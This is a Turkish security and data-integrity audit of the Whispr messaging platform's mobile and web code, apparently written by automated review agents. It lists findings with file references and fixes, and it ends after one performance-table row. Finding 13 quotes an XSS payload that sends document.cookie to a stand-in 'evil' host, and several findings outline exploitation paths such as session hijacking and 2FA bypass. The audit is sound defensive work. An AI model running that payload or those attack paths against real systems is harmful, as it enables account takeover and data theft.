# Whispr platform denetimi — mobil + web tam tarama

**Tarih:** 2026-08-12 · **Kapsam:** `apps/mobile/src` (583 dosya), `apps/web/src` (1313 dosya), `packages/types`, `packages/db`
**Yöntem:** 16 paralel salt-okunur denetim ajanı, dilim başına ayrı odak. Her bulguda `dosya:satır` + kararlayıcı satır alıntısı zorunlu tutuldu; kanıtlanamayan iddia raporlanmadı.
**Toplam:** 178 ham bulgu → tekilleştirme sonrası **147 benzersiz**. 41 HIGH, 71 MED, 35 LOW.

> Sıralama **kazanıma** göre: etki × olasılık ÷ eforu. Numaralar öncelik sırasıdır, önem sırası değil — P0-1 en yüksek kazanımlı iştir.

---

## Özet tablo

| Öbek                                | Adet | Kazanım profili                                |
| ----------------------------------- | ---- | ---------------------------------------------- |
| P0 — Güvenlik (istismar edilebilir) | 24   | Çoğu S efor, doğrudan hesap/veri riski         |
| P0 — Veri kaybı / ölü özellik       | 21   | Çoğu S efor, sessizce yanlış çalışan sistemler |
| P1 — Performans (ölçekle büyüyen)   | 45   | Karışık efor, maliyet zamanla artıyor          |
| P2 — Kalite / sessiz hata           | 57   | Çoğu S efor, kullanıcı güvenini yiyor          |

**Bir gün içinde en çok kazanç:** P0-1…P0-12 + P1-1…P1-8 → hepsi S/M efor, en ağır riski ve en büyük ölçek maliyetini kapatıyor.

---

## P0 — Güvenlik

Sıra kazanıma göre. Sev/Efor: H/M/L · S/M/L.

### 1. Derin bağlantıyla oturum ele geçirme — `state` yok

`apps/mobile/src/app/providers/mobile-deep-link-provider.tsx:66`
Gelen her `whispr://oauth/<token>` koşulsuz oturuma çevriliyor. `buildMobileWebSocialSignInUrl` yalnız `callbackUrl`/`provider`/`client` gönderiyor — nonce/state yok, dolayısıyla uygulamanın başlattığı akışla dönen token arasında bağ yok. `whispr:` düz özel şema; herhangi bir web sayfası tetikleyebilir. Saldırgan kendi hesabı için token üretip kurbana iletirse uygulama sessizce takas edip SecureStore'a yazıyor ve **kullanıcıyı değiştiriyor**; kurbanın sonraki tüm mesajları saldırganın hesabına düşüyor.
**Çare:** girişte rastgele `state` üret, `/mobile/oauth/start` üzerinden taşı, dönen bağlantıda eşleşme ara; eşleşmeyeni at, mevcut oturumu asla değiştirme. — **H · M**

### 2. Oturum iptali kayıyor — çalınan çerez şifre sıfırlamayı atlatıyor

`apps/web/src/auth.ts:812` · `apps/web/src/lib/auth/session-revocation.ts:100`
İptal kontrolü `token.iat`'e bakıyor (`issuedAtSeconds <= revokedAfterSeconds`), ama Auth.js `encode` her oturum okumasında `setIssuedAt()` çağırıyor ve kontrol `SESSION_REVOCATION_CHECK_INTERVAL_SECONDS = 60` ile kısılmış. Çalınmış çerez, iptal ile +60 sn arasında tek istek atarsa `iat` iptal damgasının önüne geçiyor ve oturum **kalıcı olarak** hayatta kalıyor. Ayrıca `token.revocationCheckedAt = nowSeconds` kontrolden **önce** yazılıyor: geçici Redis+Postgres hatası bedava 60 sn veriyor.
**Çare:** girişte bir kez yazılıp `encode` tarafından ezilmeyen `sessionStartedAt` tut, karşılaştırmayı ona yap. — **H · S**

### 3. Şifre sıfırlama mobil oturumları hiç düşürmüyor

`apps/web/src/lib/auth/password-reset.ts:395`
`revokeUserSessions` yalnız web JWT'sini etkileyen Redis anahtarını yazıyor. Mobil oturum `isMobileRefreshFamilyActive` ile doğrulanıyor ve `sessionsRevokedAfter`'ı hiç okumuyor. Hesabı ele geçirilen kullanıcı ürünün söylediği tek şeyi yapıyor — şifre sıfırlıyor — ve saldırganın telefonu giriş yapmış kalıyor, refresh ailesi TTL boyunca dönmeye devam ediyor.
**Çare:** `revokeUserSessions` mobil refresh ailelerini de silsin veya `isMobileRefreshFamilyActive` `sessionsRevokedAfter` öncesi oturumları reddetsin. — **H · M**

### 4. TOTP, Google OAuth ile atlanıyor

`apps/web/src/auth.ts:712`, `:736`
İki faktör yalnız credentials `authorize` yolunda zorlanıyor. `allowDangerousEmailAccountLinking: true` ile Google, e-postayla mevcut parolalı hesaba bağlanıyor ve `signIn` callback'i `twoFactorEnabled`'ı hiç okumuyor. 2FA açık kullanıcı "Google ile devam et" ile tek faktörle giriyor — hem web hem mobil.
**Çare:** `signIn` callback'inde (ve `linkMobileGoogleAccount` çağıranında) `twoFactorEnabled` ise step-up iste. — **H · M**

### 5. LiveKit metadata ile kimlik taklidi

`apps/web/src/lib/livekit/server.ts:278` · `apps/web/src/lib/voice/participant-mapping.ts:83`
Token `canUpdateOwnMetadata: true` veriyor, sunucu kimliği (ad, kullanıcı adı, avatar) o metadata'ya koyuyor, istemci de doğrudan oradan okuyor. Çağrıdaki herhangi biri `setMetadata('{"displayName":"Whispr Moderasyon",...}')` ile herkesin ekranında başkası gibi görünüyor; seçtiği avatar URL'i tüm izleyicilerin tarayıcısınca çekiliyor.
**Çare:** `canUpdateOwnMetadata`'yı kaldır; eş profilleri sunucunun `voice:state:update` listesinden `participant.identity` ile çöz. — **H · M**

### 6. Yetki kaldırılan kullanıcı ses odasında kalıyor

`apps/web/src/lib/voice/service.ts:666`
Kanal yetkisi düşünce kullanıcı LiveKit'ten ve DB'den atılıyor ama `voice:<channelId>` soket odasından atılmıyor (`pruneUnauthorizedVoiceStateViewers` farklı bir odaya bakıyor). Canlı listeyi ve konuşma göstergelerini almaya, kendi ses seviyesini yayınlamaya devam ediyor.
**Çare:** `disconnectUnauthorizedVoiceParticipants` içinde `socket.leave(getVoiceParticipantRoomName(channelId))` + `socket.data.voiceRooms.delete(...)`. — **H · S**

### 7. Sunucudan atılan kullanıcı sesten düşmüyor

`apps/web/src/lib/voice/service.ts:1000`
`heartbeatVoiceState` yalnız `sessionId` eşliyor, yetkiyi yeniden sormuyor. Ban/kick yolunda hiçbir yer `clearVoiceState`/`removeLiveKitVoiceParticipant` çağırmıyor. Banlanan kişinin LiveKit bağlantısı iki yönlü akmaya devam ediyor, heartbeat `VoiceState` satırını taze tuttuğu için bayat-heartbeat süpürücüsü de asla toplamıyor.
**Çare:** `detachUserFromServerSocketRoom`'dan `disconnectUnauthorizedVoiceParticipants` çağır; heartbeat'te yetkiyi yeniden kontrol et. — **H · M**

### 8. Gruptan çıkarılan üye grup çağrısında kalıyor

`apps/web/src/lib/dm/group-realtime.ts:157` · `apps/web/src/lib/livekit/server.ts:13`
Soket odasından atılıyor, LiveKit `dm:<conversationId>` odasından çıkarılmıyor. Elindeki token `LIVEKIT_TOKEN_TTL = "1h"` boyunca geçerli, sekmeyi kapatsa bile geri bağlanabiliyor.
**Çare:** çıkarma yolunda `removeParticipant('dm:<id>', userId)` + `leaveGroupCall`; TTL'i birkaç dakikaya indirip istemci tarafı yenileme ekle. — **H · M**

### 9. Admin panosu, `ANALYST`e e-posta ve `ipHash` sızdırıyor

`apps/web/src/lib/admin/snapshots/overview.ts:142`, `snapshots/users.ts:38`, `snapshots/audit.ts:46`, `snapshots/activity.ts:158`
`/api/v1/admin/dashboard` `dashboard.read` ile korunuyor (ANALYST dâhil) ama payload'ında kullanıcı e-postaları ve `AdminAuditLog` satırları (`ipHash` dâhil) var. `user.read` ANALYST'i, `audit.read` OWNER/ADMIN dışını dışlıyor. _İki bağımsız ajan doğruladı._
**Çare:** üç snapshot projeksiyonundan `email`'i, audit snapshot'ından `ipHash`'i çıkar; audit dilimini yalnız `audit.read` varsa birleştir. — **H · S**

### 10. Moderatör tüm yöneticileri atabiliyor

`apps/web/src/lib/workspace/member-service.ts:556`
`kickWorkspaceMember` yalnız sahibi koruyor; aynı dosyadaki rol düzenleme `isProtectedRole` kontrolü yapıyor. `MODERATOR_PERMISSIONS` `KICK_MEMBERS` içerdiğinden bir moderatör sahip hariç tüm ADMINISTRATOR/MANAGE_SERVER/MANAGE_ROLES sahiplerini atabiliyor — rollerini düzenleyemiyor olmasına rağmen.
**Çare:** kick yolunda da `!isOwnerAccess(access) && member.roles.some(isProtectedRole)` reddi. — **H · S**

### 11. Uygulama kilidi iyimser — kilitlenmeden içerik görünüyor

`apps/mobile/src/auth/mobile-auth-context.tsx:882`
`appLockLocked = appLockStatus === "locked"`. `refreshSessionFromStorage` depodaki anlık görüntüden `"signed-in"` yazıyor; SecureStore tercihi + `hasHardwareAsync()` + `isEnrolledAsync()` çözülene kadar durum `"idle"`/`"checking"` ve kilitli sayılmıyor. Her soğuk açılış ve her resume'da DM listesi ve sohbet içeriği boyanıyor.
**Çare:** kötümser başla; her iki okuma en az bir kez çözülene dek `"idle"`/`"checking"`'i kilitli say. — **H · S**

### 12. Çıkış sonrası oturum dirilmesi

`apps/mobile/src/auth/mobile-auth-context.tsx:429`
Uçuştaki refresh iptal edilmiyor, jenerasyon kontrolü yok. `signOut` iki ağ çağrısını beklerken herhangi bir `getAccessToken()` refresh'i tetikliyor; refresh `repository.clear()`'dan sonra çözülünce **yeni (iptal edilmemiş) token'ları geri yazıp** `signed-in`'e dönüyor. `revokeMobileAuthSession` zaten tüketilmiş eski token'ı iptal etmişti.
**Çare:** `signOut`'ta artan bir jenerasyon sayacı tut; jenerasyon ilerlemişse refresh sonucunu at. — **H · S**

### 13. Admin konsolunda XSS — hata raporu ekran görüntüsü

`apps/web/src/components/admin/sections/admin-support-reports.tsx:206` · `packages/types/src/mobile.ts:1325`
`screenshotUploadKey` şeması `z.string().min(1).max(256)` — `.url()` yok, şema kontrolü yok. Değer aynen saklanıp admin konsolunda `href` olarak basılıyor. Kimlikli mobil kullanıcı `javascript:fetch('https://evil/'+document.cookie)` gönderebilir; admin tıklayınca kimlikli admin oturumunda çalışır. Mesaj render'ı aynı sorunu `defaultUrlTransform` ile çözmüş — tutarsızlık.
**Çare:** kaydetmeden önce şemayı doğrula (yalnız `https:`) veya upload key'i sunucuda CDN URL'ine çöz. — **H · S**

### 14. `dm:message:delivered` yetkisiz + sınırsız harita

`apps/web/src/lib/socket/handlers/dm.ts:266`
Katılımcı kontrolü yok. Tek kısıt saldırganın verdiği `conversationId` ile anahtarlanmış bir `Map`; taze id'lerle döngü tabanı tamamen atlıyor. Her olay bir nested join'li Postgres okuması yapıyor ve haritaya asla temizlenmeyen bir giriş ekliyor. Global soket rate limiter yok.
**Çare:** handler'ı `isDMParticipant` ile kapıla; tabanı `userId` bazlı Redis rate limit ile değiştir. — **H · S**

### 15. Grup DTO'su aktörün görüş açısını herkese yayınlıyor

`apps/web/src/lib/dm/group-service.ts:881`
Grup yazma rotaları, eylemi yapan için render edilmiş DTO'yu tüm üyelere emit ediyor. `lastMessage` aktörün geçmiş tabanına göre hesaplanıyor — "Hiç" geçmişiyle katılan üye göremeyeceği mesajı satırda görüyor (2c §7 ihlali). Ayrıca aktörün `role`, `notifyLevel`, `pinnedAt` alanları herkesin cache'ine düşüyor.
**Çare:** alıcı başına render et (`groupRemoveMemberRoute`'un `broadcastViewerId` deseni) veya görüş-nötr payload yayınla. — **H · M**

### 16. İzin cache'i bayat revizyonla damgalıyor

`apps/web/src/lib/workspace/permission-cache.ts:521`
Snapshot, izinler DB'den okunduktan **sonra** okunan revizyonla damgalanıyor. Aradaki bir yetki iptali eziliyor ve taze sayılıyor: iptal edilen `VIEW_CHANNEL`/`SEND_MESSAGES` 45 sn'ye kadar (ayrıcalıklı bitler için 15 sn) çalışmaya devam ediyor.
**Çare:** revizyon anahtarlarını DB okumasından **önce** örnekle, yazarken versiyon kaydıysa snapshot'ı at. — **H · M**

### 17. Katılımcı DTO'su başkalarının özel sayaçlarını gösteriyor

`apps/web/src/lib/dm/service.ts:434`
`unreadCount`, `mentionCount`, `muted` tüm roster için haritalanıyor. Herhangi bir grup üyesi, bir diğerinin grubu sessize alıp almadığını ve kaç mesajının okunmadığını API yanıtından okuyabiliyor. Soketle de toptan yayılıyor.
**Çare:** `userId !== viewerId` olan her katılımcı için üç alanı sıfırla. — **M · S**

### 18. Turnstile CAPTCHA bypass'ı host kontrolsüz

`apps/web/src/lib/auth/turnstile.ts:96`
Sabit token `E2E_TURNSTILE_TOKEN`, yalnız iki env değişkenine bakılarak kabul ediliyor; kardeş E2E kapısının uyguladığı `isLocalE2EHost` kontrolü yok. `E2E_ALLOW_PRODUCTION_BUILD=true` desteklenen bir üretim yapılandırması. Token `NEXT_PUBLIC_*` ile istemci paketine de gömülü.
**Çare:** `assertE2EApiRouteEnabled`'ın host ve URL kontrollerini bypass yoluna da uygula. — **M · S**

### 19. `disableTwoFactor` parola tahmin oracle'ı

`apps/web/src/lib/auth/two-factor.ts:545` · `apps/web/src/lib/account/actions.ts:372`
Yanlış parola `invalid_credentials`, doğru parola + yanlış kod `invalid_code` dönüyor. Parola dalında `twoFactorAttemptTracker.recordFailure` çağrılmıyor ve çağıran server action'da rate limit yok — sınırsız, temiz sinyalli parola tahmini.
**Çare:** parola dalını da deneme sayacından geçir, iki hata için aynı genel mesajı dön. — **M · S**

### 20. Sentry'ye canlı token ve DB kimlik bilgisi

`apps/web/instrument.ts:67`, `:30`
`beforeSend` yalnız `event.message`, exception değerleri ve breadcrumb mesajlarını temizliyor — `event.request.url` / `query_string`'i değil. `?accountReauthToken=…` (hesap silme yetkisi) ve `?token=…` (şifre sıfırlama) query'de taşınıyor. Ayrıca sunucu temizleyicisi `logger.ts`'in 5 kalıbından 2'sini uyguluyor: `postgresql://user:PASS@host` Prisma/Redis hataları maskesiz gidiyor.
**Çare:** `request.url` ve `query_string`'i de yeniden yaz; kalıp listesini iki dosyanın import ettiği tek modüle taşı. — **M · S**

### 21. İptal sonrası yönlendirme kilidi

`apps/web/src/proxy.ts:251` · `apps/web/src/auth.ts:242`
Token payload'ı boşaltılıyor ama çerez yeniden yayınlanıyor ve hâlâ decode oluyor; proxy `isAuthenticated = Boolean(token)` diyor. Korumalı sayfa `/login`'e, proxy `/login`'den `/channels`'a atıyor → `ERR_TOO_MANY_REDIRECTS`. `token.id` de silindiği için yasaklı kullanıcı itiraz yoluna ulaşamıyor.
**Çare:** `token.revoked === true` / boş `sub`'ı kimliksiz say ve süresi dolmuş çerez başlıklarını gönder. — **M · S**

### 22. `getTrustedClientIp` hiçbir güven doğrulaması yapmıyor

`apps/web/src/lib/security/client-ip.ts:46`, `:25`
Ham `x-real-ip` başlığı rate limit anahtarı oluyor. Değer yoksa veya virgüllüyse `normalizeIpAddress` `null` dönüyor ve kimlik sessizce subject hash'ine **çöküyor** — "ağ" ve "konu" kovaları tek kovaya iniyor. Parola spreyi ve sınırsız sıfırlama e-postası tamamen sınırsız hâle geliyor. _İki ajan doğruladı._
**Çare:** güvenilen proxy CIDR setinden veya sabit hop sayısından çöz; başlık yoksa isteği reddet, subject'e düşme. — **M · M**

### 23. Mobil ortam adı tanınmazsa `development`e düşüyor

`apps/mobile/src/config/environment.ts:64`, `:132`
Tanınmayan `EXPO_PUBLIC_WHISPR_MOBILE_ENV` sessizce `"development"` oluyor; HTTPS ve yerel-olmayan-host iddiaları yalnız o ortamda atlanıyor. EAS profilindeki bir yazım hatası (`"prod"`, `"uat "`), parolayı ve bearer token'ı cleartext gönderen sevk edilebilir bir yapı üretir. `PerformanceDiagnostics` rotası da açılır.
**Çare:** tanınmayan değerde fırlat, veya fallback'i `__DEV__` ile kapıla. — **M · S**

### 24. Hesap varlık oracle'ı (mobil kayıt + giriş)

`apps/web/src/lib/mobile/auth.ts:767`, `:643`
Kayıt: doğrulanmış e-posta `EMAIL_TAKEN`/409, bilinmeyen 200 `verification-required`. Giriş: bilinmeyen e-postada bcrypt karşılaştırması hiç çalışmıyor (cost 12 ≈ birkaç yüz ms) — yanıt süresi "hesap yok" ile "şifre yanlış"ı ayırıyor.
**Çare:** alınmış e-posta için de 200 dön; eksik-kullanıcı dalında sabit bir dummy hash'e karşı `comparePassword` çalıştır. — **M · S**

_Ayrıca:_ CSRF kapısı üç başlığın da yokluğunda **izin veriyor** (`apps/web/src/proxy.ts:86`) · Şifre sıfırlama uçlarında Turnstile yok (`apps/web/src/lib/auth/actions.ts:369`) · Hesap silme re-auth token'ı query parametresinde (`apps/web/src/lib/auth/reauth-email.ts:123`) · `MANAGE_CHANNELS` iki "yükseltilmiş izin" listesinden birinde eksik, sahip olmayan biri kendini ADMIN seviyesine çıkarabiliyor (`apps/web/src/lib/workspace/role-helpers.ts:21`) · Kanal reaksiyonları yalnız `VIEW_CHANNEL` istiyor, kilitli duyuru kanalında reaksiyon atılabiliyor (`apps/web/src/lib/socket/handlers/message.ts:499`).

---

## P0 — Veri kaybı ve ölü özellikler

### 1. Kaybolan mesajlar kalıcı olarak çalışmıyor

`packages/db/prisma/schema.prisma:1513` · `apps/web/src/lib/dm/disappearing-service.ts:43`
`DMMessage.reply` FK'si `onDelete: Restrict`. Purge doğrudan `deleteMany` yapıyor ve `channel-service.ts:370`'in aynı FK için yaptığı "önce `replyToId`'yi NULL'la" adımını atlıyor. Yanıtlanmış tek bir mesaj 500'lük partiyi P2003 ile zehirliyor; worker hatayı yutuyor (`disappearing-worker.ts:156`) ve sıralama `expiresAt asc` olduğu için zehirli satırlar **kuyruğun başında sonsuza kadar** kalıyor. Gizlilik özelliği başarı raporlayıp hiçbir şey yapmıyor. _Bağımsız olarak doğrulandı._
**Çare:** `deleteMany` öncesi partiyi işaret eden `replyToId`/`threadParentId` alanlarını NULL'la, veya FK'yi `SetNull` yap. — **H · S**

### 2. Zararlı ek, karantinaya alınmadan "INFECTED" işaretleniyor

`apps/web/src/lib/attachments/scanner.ts:296`
`scanStatus: "INFECTED"` yazımı, dosyayı silen çağrıdan **önce** geliyor; giriş kapısı da `INFECTED`'i "zaten bitti" sayıyor. Silme adımındaki tek bir UploadThing hatası, doğrulanmış zararlıyı halka açık CDN URL'inde **kalıcı olarak** canlı bırakıyor ve her retry hiçbir şey yapmadan dönüyor.
**Çare:** önce sil + bildir, `scanStatus: "INFECTED"` en son yazılsın. — **H · S**

### 3. Link önizleme %100 kırık

`apps/web/src/lib/messages/link-preview.ts:427`
Özel `lookup` Node'un `autoSelectFamily` altında geçirdiği `all: true` seçeneğini yok sayıp tek adresle geri çağırıyor. Sabitlenmiş runtime'da (`engines: >=24.18.0 <25`) bu `ERR_INVALID_IP_ADDRESS` demek — `/api/v1/link-preview` ve mobil ikizi **her istekte** 502 dönüyor, negatif cache olmadığı için her retry iki DNS araması ödüyor. Mevcut test `{}` ile çağırdığından bu şekli hiç sınamıyor.
**Çare:** `options.all` set ise doğrulanmış `{address, family}` dizisiyle geri çağır. — **H · S**

### 4. Saatlik bakım bloğu ilk hatada 6 görevi iptal ediyor

`apps/web/src/lib/outbox/worker.ts:81`
`lastCleanupAt = now` yedi sıralı görevden **önce** yazılıyor ve hepsi tek `catch` altında. `cleanupJobs` (sınırsız `deleteMany`, tablo büyüdükçe zaman aşımına gidecek) patlarsa `cleanupReauthChallenges`, `cleanupMobileMediaUploads`, `rollUpClientHealthEvents`, `purgeExpiredEvidence`, `sweepModerationCaseAlerts`, `sweepBadges` **bir daha hiç koşmuyor**. Dosyanın kendi yorumu "uygulamanın sahip olduğu tek zamanlayıcı" diyor.
**Çare:** her görevi kendi try/catch'ine al; `lastCleanupAt`'i bloktan sonra yaz. — **H · S**

### 5. Telemetri günlük özeti sayacı eziyor

`apps/web/src/lib/telemetry/client-health-rollup.ts:132`
Upsert `count: summary.count` yazıyor, artırmıyor. Rollup saatlik koştuğu ve `cutoff` saatte bir ilerlediği için bir UTC gün ~24 ayrı geçişte aynı anahtara upsert ediliyor: tabloda gerçek olay sayısının ~1/24'ü, p50/p95/p99 son bir saatin. Bu tablodan türeyen tüm çökme oranı ve gecikme rakamları ~24× yanlış.
**Çare:** `count: { increment: … }`; yüzdelikleri korunan örneklem üzerinden hesapla veya bir UTC günü atomik işle. — **H · M**

### 6. Telemetri temizliği özetlenmemiş satırları siliyor

`apps/web/src/lib/telemetry/client-health-rollup.ts:150`
Okuma `take: 5_000`, silme sınırsız — **aynı predicate**. Birikme olan her turda 5.001+ satır hiç sayılmadan siliniyor. Fonksiyonun kendi yorumu "önce özetle, sonra sil… satırları kaybetmek yerine" diyor. _İki ajan doğruladı._
**Çare:** yalnız özetlenen id'leri sil; parti kısa dönene kadar döngüye al. — **H · S**

### 7. Hesap silme, medyayı işlemden önce yok ediyor

`apps/web/src/lib/account/privacy-service.ts:450`
`deleteUploadThingFiles(userId)` 35+ ifadelik interaktif işlemden **önce** çalışıyor. İşlem Prisma'nın 5 sn varsayılanını aşarsa veya deadlock olursa DB temiz geri alınıyor — ama depolama sağlayıcısındaki silme kalıcı. Kullanıcı hesabıyla devam ediyor, tüm avatarları/banner'ları/ekleri 404.
**Çare:** dosya silmeyi işlem commit'inden sonraya al. — **H · S**

### 8. Tek engelli üye tüm grubu kilitliyor

`apps/web/src/lib/dm/message-send-service.ts:242`
1:1 için yazılmış engel kapısı grup DM'inde **tüm roster'a** uygulanıyor ve `getBlockedUserIdsForUser` iki yönü de eşliyor. 32 kişilik grupta gönderen tek bir üyeyi engellemişse (veya onun tarafından engellenmişse) her gönderim `403 BLOCKED` dönüyor — hangi üye, neden belirtilmeden. Grup o kişi için kullanılamaz hâle geliyor.
**Çare:** `GROUP_DM`'de roster geneli engel iddiasını atla (1:1'de kalsın) veya engellileri teslimattan çıkar, gönderimi reddetme. — **H · S**

### 9. `mentionCount` hiç sıfırlanmıyor — kalıcı `@N` rozeti

`apps/web/src/lib/dm/realtime-service.ts:169` (tek yazıcı) · `apps/web/src/lib/dm/service.ts:1442` (sıfırlamıyor)
Repo genelinde `dMParticipant.mentionCount`'u düşüren tek bir yazma yok. Değer web kenar çubuğuna ve mobil bootstrap'e servis ediliyor. 40 kez bahsedilen kullanıcı, sohbeti açarak, bildirimi okuyarak, "tümünü okundu"ya basarak veya temizleyerek **asla** silemediği bir `@40` rozeti görüyor. _Üç ajan doğruladı._
**Çare:** `markDirectMessageRead` ve `releaseAllDirectMessageUnread`'de `mentionCount: 0` yaz. — **H · S**

### 10. 90 günlük hata raporu temizliği hiç zamanlanmamış

`apps/web/src/lib/support/bug-report-service.ts:158`
`purgeExpiredBugReports`'un üretimde **sıfır çağıranı** var — yalnız tanımı ve testleri. `deviceInfo`, 500 satıra kadar log, ekran görüntüsü ve `userId` süresiz duruyor; şemanın yorumu ("90 gün sonra silinir") ve admin arayüzünün gösterdiği silme tarihi yalan. `@@index([purgeAfter])` hiç koşmayan bir süpürme için var. _İki ajan doğruladı._
**Çare:** `outbox/worker.ts` saatlik bloğuna ekle. — **H · S**

### 11. Sunucu `AuditLog` tablosunun tek yazıcısı yok

`packages/db/prisma/schema.prisma:1788`
Kick, rol verme, kanal silme, geçmiş temizleme, sunucu ayarı değişikliği — hiçbiri iz bırakmıyor. Tek referans hesap silmedeki `deleteMany`. `VIEW_AUDIT_LOG` izni sunucu ayarlarında sunuluyor ve kalıcı olarak boş bir tabloya açılıyor. Admin yüzeyi ise `writeAdminAuditLog` ile tutarlı biçimde denetleniyor.
**Çare:** her ayrıcalıklı workspace mutasyonunun mevcut işlemi içinde bir `AuditLog` satırı yaz. — **H · L**

### 12. Web "tüm bildirimleri temizle" rozet sayaçlarını bırakmıyor

`apps/web/src/app/api/v1/notifications/clear/route.ts:11`
Rota paylaşılan servisi çağırmak yerine doğrudan `deleteMany` yapıyor; `releaseAllChannelMentions` ve `releaseAllDirectMessageUnread` atlanıyor. Rozetler, onları söndürebilecek hiçbir bildirim satırı kalmadan yanık kalıyor. Kardeş "tümünü okundu" rotası servisi çağırıyor — iki eylem birbirine zıt.
**Çare:** `await clearNotifications(userId)`. — **M · S**

### 13. `FEEDBACK` bildirimleri görünmez

`apps/web/src/lib/notifications/service.ts:34`
`FEEDBACK` canlı bir `NotificationType`; yazılıyor, sokete emit ediliyor, push'lanıyor — ama `VISIBLE_NOTIFICATION_TYPES` içinde değil. Kullanıcı push ve toast alıyor, uygulamayı açıyor, satır listede yok ve okunmamış sayacına girmiyor. Feedback servisinin yorumu "bir bahis gibi davranır" diyor; davranmıyor.
**Çare:** `"FEEDBACK"`'i listeye ve `notifications/types.ts` union'ına ekle. — **M · S**

### 14. Push kesintisi "hiç cihaz yok"tan ayırt edilemiyor

`apps/web/src/lib/mobile/push-sender.ts:179`
Expo 429/5xx dışı bir hata dönerse (400 bozuk payload, 401 kimlik rotasyonu) parti log'suz, `pushDeliveryAttempt` satırsız atlanıyor. Sonuç `{ prunedTokens: 0, sentMessages: 0 }` — meşru "token yok" erken dönüşüyle byte-byte aynı. Tüm bahis/DM/arkadaşlık push'ları sessizce durabilir.
**Çare:** başarısız partiyi logla ve sentetik `errorCode` ile `stage: "TICKET"` satırı yaz. — **M · S**

### 15. Yarıda kalan kampanya kalıcı olarak kilitleniyor

`apps/web/src/lib/admin/notification-campaigns.ts:50`
`SENDING` durumu `SENDABLE_CAMPAIGN_STATUSES` içinde değil ve hiçbir şey onu sıfırlamıyor. Gönderim döngüsü istek içinde koştuğundan bir zaman aşımı veya deploy kampanyayı `SENDING`'de bırakıyor; her retry 409 alıyor, kalan PENDING teslimatlara **hiçbir API'den** ulaşılamıyor.
**Çare:** `"SENDING"`'i listeye ekle (`dedupeKey` unique zaten devamı güvenli kılıyor) veya outbox'a bayat-`SENDING` geri alma ekle. — **M · S**

### 16. Kapatılmış moderasyon vakası yeniden açılabiliyor

`apps/web/src/lib/moderation/case-actions.ts:117`, `:69`
`claimCase` yalnız `assigneeId: null` filtreliyor; "sadece OPEN vaka üstlenilir" kuralı iki istemcide. `applyModerationCaseAction` `assigneeId` yazmadığı için üstlenilmeden çözülen vaka `null` kalıyor — web kuyruğu `scope=resolved` kabul edip üstlen düğmesini çiziyor. Tek tıkla DISMISSED/ACTIONED vaka `IN_REVIEW`'e dönüyor. Ayrı olarak `APPEALED`, `RESOLVED_STATUSES` içinde değil: itiraz edilmiş vakaya ikinci aksiyon ban'ı tekrar uygulayıp raporcu `dedupeKey` unique'inde P2002 ile 500 veriyor.
**Çare:** `claimCase`'e `status: { notIn: RESOLVED_STATUSES }` ekle; `"APPEALED"`'i `RESOLVED_STATUSES`'a ekle; raporcu fan-out'unu `createMany({ skipDuplicates: true })` yap. — **H/M · S**

### 17. Eşzamanlı iki ayrılma grubu yetim bırakıyor

`apps/web/src/lib/dm/group-service.ts:664`
`writeRemovedMember` üyelik advisory lock'ını almıyor (iki kardeş yazma yolu alıyor) ve "son üye çıkınca grubu sil" testi işlem dışındaki bir anlık görüntüden okunuyor. İki kişilik grupta eş zamanlı iki ayrılma: ikisi de `length === 2` görüyor, grup silinmiyor, sıfır katılımcılı `GROUP_DM` kalıyor. Daha kötüsü: OWNER ve tek ADMIN aynı anda ayrılırsa sahiplik **ayrılmakta olan üyeye** devrediliyor — `assertGroupAdmin`/`assertGroupOwner` bir daha geçemiyor, grup kalıcı olarak yönetilemez. _İki ajan doğruladı._
**Çare:** işlemin ilk ifadesinde `serializeGroupMembershipWrite(tx, conversationId)`; roster'ı kilit içinde yeniden oku. — **H · S**

### 18. DM keyset cursor'ı bileşik değil — mesajlar kalıcı kayboluyor

`apps/web/src/lib/dm/service.ts:801`
Cursor yalnız `createdAt` filtreliyor, sıralama ise `[{createdAt desc}, {id desc}]`. Kolon milisaniye hassasiyetinde; sayfa sınırındaki milisaniyeyi paylaşan satırlar atlanıyor ve **hiçbir kaydırmayla** erişilemiyor. Üç okuma yolu paylaşıyor.
**Çare:** `OR: [{createdAt: {lt: T}}, {createdAt: T, id: {lt: cursorId}}]`. — **M · M**

### 19. Outbox lease'i çitlenmemiş — çift teslimat

`apps/web/src/lib/outbox/service.ts:406`
Talep `lockedBy` yazıyor ama tamamlama ve hata güncellemeleri yalnız `id` ile anahtarlanıyor. 25'lik parti tek `lockedAt` alıp seri drenaj yaptığından kuyruk sonu 5 dakikalık bayat penceresini uçarken aşıyor; ikinci replika işi yeniden alıyor, birinci worker onun talebini ezerek COMPLETED yazıyor. DM bildirimleri iki kez gidiyor, analitik artışları şişiyor. Ayrıca `markOutboxJobFailed` `catch` içinde korumasız `await` — oradaki bir hata partinin kalanını terk ediyor (`:579`).
**Çare:** her iki mark fonksiyonunun `where`'ine `lockedBy: workerId` ekle, döngü ilerledikçe `lockedAt`'i yeniden damgala; `markOutboxJobFailed`'ı kendi try/catch'ine al. — **M · M**

### 20. Kanal silmek davet bağlantılarını yok ediyor

`packages/db/prisma/schema.prisma:1124`
`ServerInvite.channel` `onDelete: Cascade`, oysa davetin zorunlu hedefi `serverId`. `invite-service.ts:106` çağıran kanal vermezse otomatik bir fallback kanal atadığından pratikte her davet satırı bir `channelId` taşıyor. Bayat bir karşılama kanalını silen admin, paylaşılmış ve kalıcı davet bağlantılarının **hepsini** sessizce yok ediyor.
**Çare:** `onDelete: SetNull`. — **M · S**

### 21. `mobilePushToken` silinen hesaptan sağ çıkıyor

`apps/web/src/lib/account/privacy-service.ts:470`
Anonimleştirme işlemi ~35 modeli siliyor, `mobilePushToken` hiçbirinde değil. Push token'ı kişiye bağlı kararlı bir cihaz kimliği; silinen hesaptan sonra kalıyor.
**Çare:** işleme `tx.mobilePushToken.deleteMany({ where: { userId } })` ekle. — **M · S**

---

## P1 — Performans

### Sunucu / veritabanı

| #   | Yer                                                             | Sorun                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Kazanım·Efor |
| --- | --------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ |
| 1   | `lib/socket/handlers/message.ts:245` · `handlers/typing.ts:263` | Her `message:send` **ve her `typing:start/stop`** küme çapında iki `fetchSockets()` çağırıyor. Repo bu maliyeti çevrimiçi sayaç için zaten yasaklamış (`server-online-presence.ts:4`). Yazma göstergesi tavanı 24 olay/10 sn/kullanıcı.                                                                                                                                                                                                                                   | H·M          |
